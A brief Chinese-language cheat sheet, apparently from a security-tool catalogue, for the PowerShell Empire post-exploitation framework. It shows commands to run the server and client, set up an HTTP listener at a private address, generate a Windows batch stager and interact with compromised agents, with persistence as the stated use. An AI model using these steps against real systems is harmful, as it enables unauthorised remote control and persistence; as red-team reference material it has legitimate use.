# powershell-empire

## 简介
PowerShell 后渗透框架

## 核心参数
- 启动服务器和客户端
- 创建 listener 和 stager

## 命令示例
```bash
# 启动 Empire 服务器
powershell-empire server

# 启动 Empire 客户端
powershell-empire client

# 在客户端中创建 listener
listeners
uselistener http
set Host http://192.168.1.100:8080
execute

# 创建 stager
usestager windows/launcher_bat
set Listener http
generate

# 与 agent 交互
agents
interact AGENT_NAME
```

## 使用场景
Windows 后渗透和持久化

## 所属分类
- [命令与控制 (Command and Control)](../categories/20-command-and-control.md)
